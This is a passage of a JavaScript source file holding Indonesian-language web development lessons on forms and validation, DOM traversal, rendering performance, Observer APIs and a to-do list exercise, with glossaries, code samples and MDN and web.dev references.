            'Kemampuan bawaan HTML untuk memvalidasi tanpa menulis kode: atribut `required`, `type="email"`, `minlength`, `pattern`. Dilengkapi method seperti `checkValidity()` dan `setCustomValidity()` dari JavaScript. Keuntungan besarnya: pesan errornya otomatis mengikuti bahasa perangkat pengguna.',
        },
        {
          term: 'autocomplete',
          meaning:
            'Atribut yang memberi tahu browser **jenis data apa** yang diminta sebuah input — `name`, `email`, `current-password`. Bukan sekadar kenyamanan: pengisian otomatis yang bekerja benar mengurangi salah ketik, dan sangat membantu pengguna dengan keterbatasan motorik.',
        },
        {
          term: 'label',
          meaning:
            'Elemen `<label>` yang dihubungkan ke input lewat `for` yang cocok dengan `id`-nya. Wajib ada: tanpa itu, pembaca layar tidak bisa menyebutkan input itu untuk apa, dan area yang bisa diklik untuk memfokuskan input jadi jauh lebih kecil.',
        },
      ),

      h2('Tiga event yang berbeda'),
      table(
        ['Event', 'Kapan terpicu'],
        [
          ['`input`', 'Setiap ketikan — untuk pratinjau langsung'],
          ['`change`', 'Setelah selesai dan kehilangan fokus (atau memilih)'],
          ['`submit`', 'Pada `<form>`, bukan pada tombolnya'],
        ],
      ),
      callout(
        'danger',
        'Pasang listener pada `<form>`, bukan pada tombol',
        'Menekan Enter di dalam input juga mengirim form. Listener yang hanya ada di tombol akan melewatkannya sepenuhnya — dan halaman akan memuat ulang tanpa penjelasan.',
      ),

      h2('`FormData`'),
      code(
        'html',
        `
        <form id="daftar">
          <label for="nama">Nama</label>
          <input id="nama" name="nama" required autocomplete="name" />

          <label for="email">Email</label>
          <input id="email" name="email" type="email" required autocomplete="email" />

          <label>
            <input type="checkbox" name="setuju" /> Saya setuju
          </label>

          <button type="submit">Daftar</button>
        </form>
        `,
      ),
      code(
        'js',
        `
        const form = document.querySelector('#daftar');

        form.addEventListener('submit', (e) => {
          e.preventDefault();

          const fd = new FormData(form);

          fd.get('nama');                    // 'Zum'
          fd.get('setuju');                  // 'on' atau null
          Object.fromEntries(fd);            // { nama: 'Zum', email: '...' }

          // Untuk field yang boleh berulang (checkbox dengan nama sama)
          fd.getAll('minat');                // ['a', 'b']
        });
        `,
      ),
      callout(
        'warning',
        '`FormData` hanya membaca input yang punya atribut `name`',
        'Bukan `id`. Input tanpa `name` diabaikan diam-diam — dan ini penyebab "kenapa fieldnya kosong" yang paling sering.',
      ),

      h2('Validasi bawaan HTML'),
      code(
        'html',
        `
        <input
          name="email"
          type="email"
          required
          minlength="5"
          maxlength="100"
          autocomplete="email"
        />
        <input name="umur" type="number" min="17" max="120" />
        <input name="kode" pattern="[A-Z]{3}-\\d{4}" />
        `,
      ),
      code(
        'js',
        `
        input.checkValidity();      // true/false
        input.validity.tooShort;    // detail kenapa gagal
        input.validity.typeMismatch;
        input.validationMessage;    // pesan bawaan browser, sudah diterjemahkan

        // Pesan kustom
        input.setCustomValidity(sudahDipakai ? 'Email ini sudah terdaftar' : '');
        `,
      ),

      h2('Menampilkan error dengan benar'),
      code(
        'js',
        `
        function tampilkanError(input, pesan) {
          const kotak = document.querySelector(\`#error-\${input.name}\`);

          kotak.textContent = pesan;                       // teks, bukan HTML
          input.setAttribute('aria-invalid', String(Boolean(pesan)));
          input.setAttribute('aria-describedby', kotak.id);
        }

        form.addEventListener('submit', (e) => {
          e.preventDefault();

          if (!form.checkValidity()) {
            const pertamaGagal = form.querySelector(':invalid');
            pertamaGagal?.focus();          // arahkan pengguna ke masalahnya
            return;
          }

          kirim(new FormData(form));
        });
        `,
      ),
      callout(
        'tip',
        'Tiga hal yang sering terlewat pada form',
        'Pesan error harus **berada di dekat fieldnya** dan terhubung lewat `aria-describedby`; fokus harus **berpindah ke field pertama yang gagal**; dan tombol submit harus **dinonaktifkan selama pengiriman** supaya tidak terkirim dua kali.',
      ),

      h2('Validasi klien bukan pengaman'),
      code(
        'js',
        `
        // Semua ini bisa dilewati dalam sepuluh detik lewat DevTools:
        //   - menghapus atribut required
        //   - mengubah maxlength
        //   - memanggil endpoint langsung dengan curl, tanpa membuka halaman sama sekali
        //
        // Validasi di klien adalah soal PENGALAMAN: umpan balik cepat, tanpa
        // menunggu jaringan. Kontrol keamanannya SELALU di server.
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Pasang `submit` pada `<form>`, bukan pada tombolnya.',
        '`FormData` hanya membaca input yang punya `name`.',
        'Validasi bawaan HTML sudah membawa pesan yang diterjemahkan — pakai sebelum menulis sendiri.',
        'Error di dekat fieldnya, terhubung `aria-describedby`, dan fokus ke yang pertama gagal.',
        'Validasi klien adalah UX; kontrol keamanannya di server.',
      ),
      references(
        {
          label: 'FormData',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/FormData',
          source: 'MDN',
          note: 'Menegaskan bahwa hanya input dengan atribut `name` yang ikut terbaca.',
        },
        {
          label: 'Client-side form validation',
          href: 'https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Forms/Form_validation',
          source: 'MDN',
          note: 'Termasuk peringatan resmi bahwa validasi klien bukan kontrol keamanan.',
        },
        {
          label: 'Constraint Validation API',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTML/Guides/Constraint_validation',
          source: 'MDN',
          note: 'Validasi bawaan HTML yang pesannya otomatis mengikuti bahasa perangkat pengguna.',
        },
        {
          label: 'HTML attribute: autocomplete',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/autocomplete',
          source: 'MDN',
          note: 'Daftar lengkap nilai yang membuat pengisian otomatis benar-benar bekerja.',
        },
        {
          label: 'Input Validation Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Alasan keamanan di balik aturan "validasi klien untuk UX, validasi server untuk keamanan".',
        },
      ),
    ],
  ),

  written(
    'traversal-dom',
    'Menelusuri DOM',
    9,
    'Bergerak dari satu elemen ke tetangganya, induknya, atau anaknya.',
    [
      terms(
        {
          term: 'traversal',
          meaning:
            'Dibaca "tra-ver-sal", terjemahannya **penelusuran**. Bergerak dari satu node ke node lain di dalam pohon DOM — naik ke induk, turun ke anak, atau menyamping ke saudara. Dipakai ketika kamu sudah memegang satu elemen dan butuh elemen lain yang posisinya berhubungan dengannya.',
        },
        {
          term: 'parent',
          meaning:
            'Terjemahannya **induk**. Node yang berada satu tingkat di atas. Pakai `parentElement` dan bukan `parentNode` — keduanya hampir selalu sama, kecuali di puncak pohon, dan versi `Element` lebih jarang memberi kejutan.',
        },
        {
          term: 'child',
          meaning:
            'Terjemahannya **anak**. Node yang berada langsung di dalam sebuah elemen. Perhatikan pembedaan penting: `children` hanya berisi **elemen**, sementara `childNodes` juga menghitung teks dan komentar.',
        },
        {
          term: 'sibling',
          meaning:
            'Terjemahannya **saudara**. Node yang berbagi induk yang sama. `nextElementSibling` mengambil saudara berikutnya, `previousElementSibling` yang sebelumnya.',
        },
        {
          term: 'descendant',
          meaning:
            'Terjemahannya **keturunan**. Semua node yang berada di dalam sebuah elemen, berapa pun tingkat kedalamannya — bukan hanya anak langsungnya. `querySelector` mencari di antara seluruh keturunan.',
        },
        {
          term: 'firstChild vs firstElementChild',
          meaning:
            'Pembedaan yang paling sering menjebak. Pada HTML yang diindentasi rapi, `firstChild` biasanya adalah **text node berisi spasi dan baris baru**, bukan elemen pertama yang kamu lihat. Selalu pakai `firstElementChild` kecuali kamu memang sedang mengurus teks.',
        },
        {
          term: 'closest',
          meaning:
            'Menelusuri **ke atas** mencari elemen terdekat yang cocok dengan selector, dimulai dari elemen itu sendiri. Mengembalikan `null` kalau sampai ke akar dokumen tidak ada yang cocok. Pasangan wajib event delegation dari sub-bab sebelumnya.',
        },
        {
          term: 'matches',
          meaning:
            'Menjawab pertanyaan **"apakah elemen ini cocok dengan selector tersebut?"** dengan `true` atau `false`, tanpa menelusuri ke mana pun. Berguna untuk menyaring di dalam pendengar delegation: `if (!e.target.matches("[data-aksi]")) return;`.',
        },
        {
          term: 'contains',
          meaning:
            'Menjawab apakah sebuah node berada **di dalam** node lain. Pemakaian paling umum: mendeteksi klik di luar sebuah menu, dengan `if (!menu.contains(e.target)) tutupMenu()`.',
        },
      ),

      h2('Element vs Node'),
      code(
        'js',
        `
        // Versi 'Element' mengabaikan text node — hampir selalu yang kamu mau
        el.parentElement;              vs   el.parentNode;
        el.children;                   vs   el.childNodes;
        el.firstElementChild;          vs   el.firstChild;
        el.nextElementSibling;         vs   el.nextSibling;
        el.previousElementSibling;     vs   el.previousSibling;
        `,
      ),
      callout(
        'warning',
        '`firstChild` sering bukan yang kamu kira',
        'Pada HTML yang diindentasi, `firstChild` biasanya adalah **text node berisi spasi dan baris baru**, bukan elemen pertama. Pakai `firstElementChild`.',
      ),

      h2('`closest` — naik sampai ketemu'),
      code(
        'js',
        `
        // Dari titik klik, naik sampai menemukan yang cocok (termasuk dirinya sendiri)
        e.target.closest('[data-id]');
        e.target.closest('li');
        e.target.closest('form');

        // null kalau tidak ada sampai akar dokumen
        `,
      ),
      p(
        '`closest` adalah pasangan wajib event delegation, dan salah satu method DOM yang paling sering terpakai.',
      ),

      h2('Memeriksa hubungan'),
      code(
        'js',
        `
        wadah.contains(el);              // true kalau el di dalam wadah (atau el === wadah)
        el.matches('.aktif');            // true kalau el cocok dengan selector

        // Pola "klik di luar" — untuk menutup dropdown
        document.addEventListener('click', (e) => {
          if (!dropdown.contains(e.target)) tutup();
        });
        `,
      ),

      h2('Mencari ke bawah'),
      code(
        'js',
        `
        kartu.querySelector('.judul');       // pertama di dalam kartu
        kartu.querySelectorAll('button');    // semua di dalam kartu

        [...daftar.children];                // anak langsung saja
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Pakai versi `*Element*` — ia mengabaikan text node dari indentasi.',
        '`closest` naik sampai menemukan yang cocok; pasangan wajib event delegation.',
        '`contains` untuk memeriksa "apakah di dalam"; `matches` untuk "apakah cocok".',
        'Pola klik-di-luar dibangun dari `contains`, bukan dari `stopPropagation`.',
      ),
      references(
        {
          label: 'Element.children',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/children',
          source: 'MDN',
          note: 'Hanya berisi elemen — bandingkan dengan `childNodes` yang menghitung teks juga.',
        },
        {
          label: 'Node.firstChild',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Node/firstChild',
          source: 'MDN',
          note: 'Halaman ini sendiri memperingatkan soal text node dari indentasi.',
        },
        {
          label: 'Element.matches()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/matches',
          source: 'MDN',
          note: 'Penyaring ringkas di dalam pendengar event delegation.',
        },
        {
          label: 'Node.contains()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Node/contains',
          source: 'MDN',
          note: 'Dasar pola klik-di-luar yang jauh lebih baik daripada `stopPropagation`.',
        },
        {
          label: 'Traversing an HTML table with JavaScript',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Traversing_an_HTML_table_with_JavaScript_and_DOM_Interfaces',
          source: 'MDN',
          note: 'Contoh penelusuran DOM yang lebih panjang, langsung dari dokumentasi resmi.',
        },
      ),
    ],
  ),

  written(
    'performa-dom',
    'Performa: reflow, repaint, batching',
    13,
    'Kenapa manipulasi DOM bisa membuat halaman terasa berat — dan cara mengukurnya.',
    [
      terms(
        {
          term: 'reflow',
          meaning:
            'Disebut juga *layout*. Perhitungan ulang **posisi dan ukuran** seluruh elemen oleh browser. Ini langkah **paling mahal** dari ketiganya, karena mengubah ukuran satu elemen bisa menggeser semua elemen di sekitarnya, yang lalu menggeser elemen lain lagi.',
        },
        {
          term: 'repaint',
          meaning:
            'Disebut juga *paint*. Menggambar ulang **piksel** sebuah elemen tanpa mengubah posisinya — misalnya saat warnanya berubah. Lebih murah daripada reflow, tapi tetap bukan gratis.',
        },
        {
          term: 'composite',
          meaning:
            'Terjemahannya **menyusun lapisan**. Langkah terakhir yang menggabungkan lapisan-lapisan yang sudah digambar menjadi satu tampilan. **Paling murah** karena bisa dikerjakan GPU, dan hanya `transform` serta `opacity` yang bisa berhenti di langkah ini saja.',
        },
        {
          term: 'layout thrashing',
          meaning:
            'Terjemahan bebasnya **layout yang dihajar bolak-balik**. Pola membaca ukuran lalu menulis style, dibaca lagi lalu ditulis lagi, berulang-ulang di dalam loop. Setiap pembacaan **memaksa** browser menghitung ulang tata letak yang baru saja dibatalkan oleh penulisan sebelumnya. Ini penyebab lambat yang paling sering, dan kodenya terlihat sangat wajar.',
        },
        {
          term: 'forced synchronous layout',
          meaning:
            'Nama resmi dari apa yang terjadi pada layout thrashing: browser **dipaksa** menghitung tata letak saat itu juga, di luar jadwalnya sendiri. Pemicunya adalah property seperti `offsetWidth`, `offsetHeight`, `getBoundingClientRect()`, dan `getComputedStyle()`.',
        },
        {
          term: 'batching',
          meaning:
            'Terjemahannya **menggabungkan jadi satu rombongan**. Obat untuk layout thrashing: **baca semua dulu, baru tulis semua**. Dengan memisahkan kedua fase, browser hanya perlu menghitung ulang satu kali alih-alih sekali untuk tiap elemen.',
        },
        {
          term: 'requestAnimationFrame',
          meaning:
            'Fungsi untuk menjadwalkan pekerjaan **tepat sebelum browser menggambar frame berikutnya**. Dipakai untuk animasi dan pembaruan visual, karena ia otomatis selaras dengan laju gambar layar — dan berhenti sendiri saat tab tidak terlihat, sehingga hemat baterai.',
        },
        {
          term: '60 fps',
          meaning:
            'Singkatan *frames per second*, artinya **60 gambar per detik** — laju yang membuat gerakan terasa mulus. Konsekuensi angkanya: setiap frame hanya punya jatah sekitar **16,7 milidetik**. Pekerjaan yang melewati batas itu membuat frame terlewat, dan mata langsung menangkapnya sebagai tersendat.',
        },
        {
          term: 'GPU',
          meaning:
            'Singkatan *Graphics Processing Unit*, prosesor khusus untuk urusan gambar. Langkah composite bisa dilimpahkan ke sini, dan itulah alasan teknis kenapa menganimasikan `transform` jauh lebih mulus daripada menganimasikan `width` atau `left`.',
        },
        {
          term: 'profiling',
          meaning:
            'Terjemahannya **pengukuran mendalam**. Memakai tab Performance di DevTools untuk melihat **ke mana waktu benar-benar pergi**, bukan menebak. Prinsipnya sama dengan Sub-bab 3.12: ukur dulu, baru optimalkan.',
        },
      ),

      h2('Tiga langkah render'),
      table(
        ['Langkah', 'Artinya', 'Biaya'],
        [
          ['**Layout / reflow**', 'Menghitung ulang posisi dan ukuran', 'Paling mahal'],
          ['**Paint**', 'Menggambar piksel', 'Sedang'],
          ['**Composite**', 'Menyusun lapisan', 'Murah — bisa di GPU'],
        ],
      ),
      code(
        'js',
        `
        el.style.width = '200px';       // reflow + paint + composite
        el.style.color = 'red';         // paint + composite
        el.style.transform = 'translateX(10px)';   // composite saja
        el.style.opacity = '0.5';                  // composite saja
        `,
      ),
      callout(
        'tip',
        'Kenapa animasi selalu memakai `transform` dan `opacity`',
        'Keduanya hanya memicu tahap composite, yang berjalan di GPU dan tidak menyentuh layout. Menganimasikan `width`, `top`, atau `margin` memicu reflow **setiap frame** — itulah beda animasi mulus dan animasi tersendat.',
      ),

      h2('Layout thrashing'),
      code(
        'js',
        `
        // LAMBAT: membaca dan menulis bergantian
        for (const el of elemen) {
          el.style.height = el.offsetHeight + 10 + 'px';
        }
        // offsetHeight memaksa browser MENYELESAIKAN layout yang tertunda.
        // Karena ada penulisan sebelumnya, layout dihitung ulang tiap iterasi.
        `,
      ),
      code(
        'js',
        `
        // CEPAT: baca semua dulu, baru tulis semua
        const tinggi = elemen.map((el) => el.offsetHeight);   // fase baca
        elemen.forEach((el, i) => {
          el.style.height = tinggi[i] + 10 + 'px';            // fase tulis
        });
        `,
      ),
      p(
        'Property yang memicu layout paksa: `offsetTop/Left/Width/Height`, `clientWidth/Height`, `scrollTop/Height`, `getBoundingClientRect()`, dan `getComputedStyle()`.',
      ),

      h2('`requestAnimationFrame`'),
      code(
        'js',
        `
        // SALAH: menyentuh DOM setiap kali event scroll terpicu (bisa ratusan kali/detik)
        window.addEventListener('scroll', () => {
          bar.style.width = hitungPersen() + '%';
        });

        // BENAR: paling banyak sekali per frame
        let terjadwal = false;

        window.addEventListener('scroll', () => {
          if (terjadwal) return;
          terjadwal = true;

          requestAnimationFrame(() => {
            bar.style.width = hitungPersen() + '%';
            terjadwal = false;
          });
        }, { passive: true });
        `,
      ),

      h2('Ukur, jangan menebak'),
      ol(
        'Buka **Performance** di DevTools, rekam interaksi yang terasa lambat.',
        'Cari blok kuning (**Scripting**) dan ungu (**Rendering**) yang panjang.',
        'Segitiga merah di sudut task menandakan **long task** — apa pun di atas 50 ms memblokir interaksi.',
        'Klik untuk melihat fungsi mana penyebabnya. Perbaiki yang itu, bukan yang kamu duga.',
      ),
      callout(
        'warning',
        'Optimasi tanpa pengukuran hampir selalu salah sasaran',
        'Kode yang "terlihat lambat" sering bukan penyebabnya. `code-style.md` menyebut ini terang-terangan: jangan mengorbankan kejelasan demi optimasi mikro tanpa bukti pengukuran.',
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Reflow (layout) paling mahal; `transform` dan `opacity` hanya memicu composite.',
        'Membaca property layout memaksa perhitungan — jangan diselang-seling dengan penulisan.',
        'Kumpulkan semua pembacaan dulu, baru semua penulisan.',
        '`requestAnimationFrame` membatasi pembaruan ke satu kali per frame.',
        'Ukur dengan Performance panel sebelum mengubah apa pun.',
      ),
      references(
        {
          label: 'Avoid large, complex layouts and layout thrashing',
          href: 'https://web.dev/articles/avoid-large-complex-layouts-and-layout-thrashing',
          source: 'web.dev',
          note: 'Rujukan utama sub-bab ini, lengkap dengan daftar property yang memicu layout paksa.',
        },
        {
          label: 'Stick to compositor-only properties',
          href: 'https://web.dev/articles/stick-to-compositor-only-properties-and-manage-layer-count',
          source: 'web.dev',
          note: 'Alasan `transform` dan `opacity` jauh lebih murah daripada `width` atau `left`.',
        },
        {
          label: 'Window.requestAnimationFrame()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/requestAnimationFrame',
          source: 'MDN',
          note: 'Termasuk perilaku berhenti sendiri saat tab tidak terlihat.',
        },
        {
          label: 'Analyze runtime performance',
          href: 'https://developer.chrome.com/docs/devtools/performance',
          source: 'Chrome DevTools',
          note: 'Panduan resmi membaca panel Performance — langkah "ukur, jangan menebak" di atas.',
        },
        {
          label: 'Interaction to Next Paint (INP)',
          href: 'https://web.dev/articles/inp',
          source: 'web.dev',
          note: 'Ambang resmi yang menjelaskan kenapa task di atas 50 ms terasa mengganggu.',
        },
      ),
    ],
  ),

  written(
    'observer-api',
    'Observer API',
    12,
    'Bereaksi terhadap perubahan tanpa polling dan tanpa listener scroll.',
    [
      p(
        'Tiga API bawaan yang memberi tahu saat sesuatu berubah — jauh lebih murah daripada memeriksa terus-menerus.',
      ),

      terms(
        {
          term: 'observer',
          meaning:
            'Terjemahannya **pengamat**. Objek yang kamu daftarkan sekali, lalu **browser yang memberi tahu** ketika sesuatu berubah. Kebalikan dari cara lama yang harus terus-menerus memeriksa sendiri — dan justru "diberi tahu" versus "memeriksa" inilah yang membuatnya jauh lebih murah.',
        },
        {
          term: 'polling',
          meaning:
            'Terjemahannya **memeriksa berulang-ulang**. Cara lama mengetahui perubahan: menjalankan pemeriksaan tiap sekian milidetik, entah ada perubahan atau tidak. Boros karena sebagian besar pemeriksaannya sia-sia, dan tetap saja terlambat mengetahui perubahan yang terjadi di sela-selanya.',
        },
        {
          term: 'IntersectionObserver',
          meaning:
            'Dari *intersection* (perpotongan). Pengamat yang memberi tahu ketika sebuah elemen **masuk atau keluar area layar**. Menggantikan pendengar `scroll` yang berjalan puluhan kali per detik. Pemakaian sehari-harinya: memuat gambar saat mendekati layar, infinite scroll, dan penanda bagian aktif pada daftar isi.',
        },
        {
          term: 'ResizeObserver',
          meaning:
            'Pengamat yang memberi tahu ketika **ukuran sebuah elemen** berubah — bukan hanya ukuran jendela. Ini pembedaan pentingnya: sebuah panel bisa berubah lebar karena sidebar dibuka, tanpa jendela browser berubah sama sekali, dan `window.resize` tidak akan tahu apa-apa.',
        },
        {
          term: 'MutationObserver',
          meaning:
            'Pengamat yang memberi tahu ketika **isi DOM berubah** — elemen ditambah, dihapus, atau atributnya diubah. Paling jarang dibutuhkan dari ketiganya, karena biasanya kamu sendiri yang mengubah DOM sehingga sudah tahu. Berguna saat perubahannya datang dari kode pihak ketiga.',
        },
        {
          term: 'entry',
          meaning:
            'Satu laporan perubahan yang diterima callback pengamat. Perhatikan bahwa callback selalu menerima **array** — beberapa perubahan bisa dilaporkan sekaligus dalam satu panggilan, sehingga kamu hampir selalu perlu me-loop isinya.',
        },
        {
          term: 'isIntersecting',
          meaning:
            'Property boolean pada entry yang menjawab apakah elemennya **sedang bersinggungan** dengan area pengamatan. Wajib diperiksa lebih dulu, karena callback juga dipanggil saat elemen **keluar** layar — bukan hanya saat masuk.',
        },
        {
          term: 'rootMargin',
          meaning:
            'Opsi yang **melebarkan atau menyempitkan** area pengamatan. Menulis `"200px"` membuat elemen dianggap masuk **200 piksel sebelum benar-benar terlihat** — sehingga gambar sudah selesai dimuat tepat ketika pengguna sampai ke sana.',
        },
        {
          term: 'threshold',
          meaning:
            'Terjemahannya **ambang**. Seberapa banyak bagian elemen yang harus terlihat sebelum callback dipanggil. `0` berarti sedikit saja sudah cukup, `1` berarti harus terlihat seluruhnya, `0.5` berarti setengahnya.',
        },
        {
          term: 'unobserve / disconnect',
          meaning:
            '`unobserve(el)` berhenti mengamati **satu** elemen; `disconnect()` menghentikan **seluruh** pengamatan sekaligus. Wajib dipanggil kalau pengamatannya memang cuma sekali — seperti memuat gambar — agar tidak ada pekerjaan sia-sia dan memori yang tertahan.',
        },
      ),

      h2('`IntersectionObserver` — saat elemen masuk layar'),
      code(
        'js',
        `
        const pengamat = new IntersectionObserver(
          (entries) => {
            for (const entry of entries) {
              if (!entry.isIntersecting) continue;

              const img = entry.target;
              img.src = img.dataset.src;      // baru muat sekarang
              pengamat.unobserve(img);        // sekali saja
            }
          },
          {
            rootMargin: '200px',   // mulai memuat 200px SEBELUM terlihat
            threshold: 0,
          },
        );

        document.querySelectorAll('img[data-src]').forEach((img) => pengamat.observe(img));
        `,
      ),
      callout(
        'tip',
        'Pemakaian lain yang sering',
        'Infinite scroll (amati elemen sentinel di bawah daftar), penanda bagian aktif pada daftar isi, dan menghentikan video saat keluar layar. Website ini memakainya untuk menandai bagian aktif di daftar isi halaman materi.',
      ),

      h2('`ResizeObserver` — saat ukuran elemen berubah'),
      code(
        'js',
        `
        const pengamatUkuran = new ResizeObserver((entries) => {
          for (const entry of entries) {
            const { width } = entry.contentRect;
            entry.target.classList.toggle('sempit', width < 400);
          }
        });

        pengamatUkuran.observe(kartu);
        `,
      ),
      p(
        'Bedanya dengan `window.resize`: ia memantau **elemennya**, bukan jendela. Elemen bisa berubah ukuran karena sidebar terbuka, font termuat, atau isinya bertambah — tanpa jendela berubah sama sekali.',
      ),

      h2('`MutationObserver` — saat DOM berubah'),
      code(
        'js',
        `
        const pengamatDom = new MutationObserver((mutasi) => {
          for (const m of mutasi) {
            if (m.type === 'childList') console.log('anak berubah', m.addedNodes);
            if (m.type === 'attributes') console.log('atribut', m.attributeName);
          }
        });

        pengamatDom.observe(wadah, {
          childList: true,
          attributes: true,
          subtree: true,
        });
        `,
      ),
      callout(
        'warning',
        '`MutationObserver` adalah pilihan terakhir',
        'Kalau kamu yang mengubah DOM-nya, kamu sudah tahu kapan itu terjadi — panggil saja fungsinya langsung. Ia benar-benar diperlukan hanya saat mengamati DOM yang diubah kode di luar kendalimu.',
      ),

      h2('Selalu putuskan pengamatan'),
      code(
        'js',
        `
        pengamat.unobserve(el);   // berhenti mengamati satu elemen
        pengamat.disconnect();    // berhenti sepenuhnya

        // Di React:
        useEffect(() => {
          const o = new IntersectionObserver(cb);
          o.observe(ref.current);
          return () => o.disconnect();     // WAJIB
        }, []);
        `,
      ),

      h2('Kenapa ini mengalahkan listener `scroll`'),
      table(
        ['', 'Listener `scroll`', '`IntersectionObserver`'],
        [
          ['Frekuensi', 'Ratusan kali per detik', 'Hanya saat melintasi ambang'],
          ['Butuh baca layout', 'Ya (`getBoundingClientRect`)', 'Tidak'],
          ['Berjalan di main thread', 'Ya', 'Sebagian di luar'],
          ['Kode', 'Manual, perlu throttle', 'Deklaratif'],
        ],
      ),

      divider,
      h2('Rangkuman'),
      ul(
        '`IntersectionObserver` untuk lazy load, infinite scroll, dan penanda bagian aktif.',
        '`ResizeObserver` memantau elemen, bukan jendela.',
        '`MutationObserver` hanya untuk DOM yang diubah kode di luar kendalimu.',
        'Selalu `disconnect()` saat selesai — kalau tidak, memori tertahan.',
        'Observer jauh lebih murah daripada listener `scroll` yang membaca layout.',
      ),
      references(
        {
          label: 'Intersection Observer API',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API',
          source: 'MDN',
          note: 'Seluruh opsi `root`, `rootMargin`, dan `threshold` beserta contoh lazy loading.',
        },
        {
          label: 'ResizeObserver',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/ResizeObserver',
          source: 'MDN',
          note: 'Memantau ukuran elemen, bukan jendela — pembedaan yang menjadi inti sub-bab ini.',
        },
        {
          label: 'MutationObserver',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver',
          source: 'MDN',
          note: 'Untuk DOM yang diubah kode di luar kendalimu; callback-nya masuk antrean microtask.',
        },
        {
          label: 'Lazy loading images',
          href: 'https://web.dev/articles/lazy-loading-images',
          source: 'web.dev',
          note: 'Perbandingan `IntersectionObserver` dengan atribut bawaan `loading="lazy"`.',
        },
        {
          label: 'Debounce your input handlers',
          href: 'https://web.dev/articles/debounce-your-input-handlers',
          source: 'web.dev',
          note: 'Alasan pendengar `scroll` yang membaca layout jauh lebih mahal daripada observer.',
        },
      ),
    ],
  ),

  written(
    'praktik-todo-dom',
    'Praktik: To-Do List versi DOM penuh',
    16,
    'Menyambungkan modul logika Bab 1 ke tampilan nyata — tanpa menyentuh logikanya sama sekali.',
    [
      p(
        'Di Bab 1 kamu menulis `todo.js` yang tidak tahu-menahu soal layar. Sekarang kamu memberinya tampilan. Modul logikanya **tidak diubah satu baris pun** — itulah bukti bahwa pemisahannya benar.',
      ),

      terms(
        {
          term: 'render dari data',
          meaning:
            'Pola di mana tampilan **selalu dibangun ulang dari satu sumber data**, alih-alih diubah sepotong-sepotong setiap ada kejadian. Keuntungannya besar: tidak mungkin ada bagian layar yang tertinggal tidak ikut diperbarui. Ini juga persis prinsip yang dipakai React, dan mengerjakannya manual di sini membuat React jauh lebih masuk akal nanti.',
        },
        {
          term: 'single source of truth',
          meaning:
            'Terjemahannya **satu sumber kebenaran**. Aturan bahwa setiap data hanya boleh punya **satu** tempat penyimpanan resmi. Di praktik ini, variabel `daftar` adalah sumbernya; DOM hanyalah cerminan. Begitu ada dua tempat yang menyimpan hal sama, keduanya pasti berselisih cepat atau lambat.',
        },
        {
          term: 'sr-only',
          meaning:
            'Singkatan *screen reader only*, artinya **hanya untuk pembaca layar**. Class yang menyembunyikan teks dari mata tapi tetap membiarkannya dibacakan teknologi bantu. Dipakai untuk label yang secara visual sudah jelas dari konteks, tapi tetap wajib ada bagi pengguna tunanetra.',
        },
        {
          term: 'role="alert"',
          meaning:
            'Atribut ARIA yang memberi tahu pembaca layar untuk **langsung membacakan** isi elemen itu begitu berubah, memotong apa pun yang sedang dibaca. Dipakai untuk pesan error yang tidak boleh terlewat.',
        },
        {
          term: 'aria-live',
          meaning:
            'Atribut yang menandai sebuah area sebagai **berubah-ubah**, sehingga pembaca layar mengumumkan perubahannya. Nilai `polite` berarti "tunggu sampai pengguna berhenti sebentar" — pilihan yang tepat untuk ringkasan jumlah tugas yang sering berubah.',
        },
        {
          term: 'aria-pressed',
          meaning:
            'Atribut yang menyatakan sebuah tombol sedang **dalam keadaan tertekan** atau tidak. Dipakai pada tombol filter di praktik ini agar pembaca layar tahu filter mana yang sedang aktif — sesuatu yang bagi pengguna awas terlihat dari warnanya saja.',
        },
        {
          term: 'ARIA',
          meaning:
            'Singkatan *Accessible Rich Internet Applications*. Sekumpulan atribut yang menjelaskan **peran dan keadaan** sebuah elemen kepada teknologi bantu. Aturan pertamanya justru menganjurkan menahan diri: kalau ada elemen HTML bawaan yang sudah tepat, pakai itu dan jangan tambahkan ARIA.',
        },
        {
          term: 'aria-label',
          meaning:
            'Memberi **nama** pada elemen yang tidak punya teks terlihat — misalnya tombol yang hanya berisi ikon. Tanpa itu, pembaca layar hanya bisa mengumumkan "tombol" tanpa keterangan apa pun tentang fungsinya.',
        },
        {
          term: 'el (objek)',
          meaning:
            'Di praktik ini, sebuah objek yang **mengumpulkan seluruh elemen** hasil seleksi di satu tempat: `el.form`, `el.input`, `el.daftar`. Polanya berguna karena semua `querySelector` terjadi sekali di awal, bukan berulang-ulang di dalam tiap fungsi.',
        },
      ),

      h2('1. Struktur HTML'),
      code(
        'html',
        `
        <main>
          <h1>Daftar Tugas</h1>

          <form id="form-tugas">
            <label for="judul" class="sr-only">Tugas baru</label>
            <input id="judul" name="judul" required autocomplete="off"
                   placeholder="Apa yang ingin kamu kerjakan?" />
            <button type="submit">Tambah</button>
          </form>

          <p id="error" role="alert"></p>

          <div role="group" aria-label="Saring tugas">
            <button type="button" data-filter="semua" aria-pressed="true">Semua</button>
            <button type="button" data-filter="aktif" aria-pressed="false">Aktif</button>
            <button type="button" data-filter="selesai" aria-pressed="false">Selesai</button>
          </div>

          <ul id="daftar"></ul>
          <p id="ringkasan" aria-live="polite"></p>
        </main>
        `,
      ),

      h2('2. Render dari data, bukan menulis HTML manual'),
      code(
        'js',
        `
        import { buatTugas, tambah, hapus, toggleSelesai, saring, ringkasan, FILTER }
          from './todo.js';

        const el = {
          form: document.querySelector('#form-tugas'),
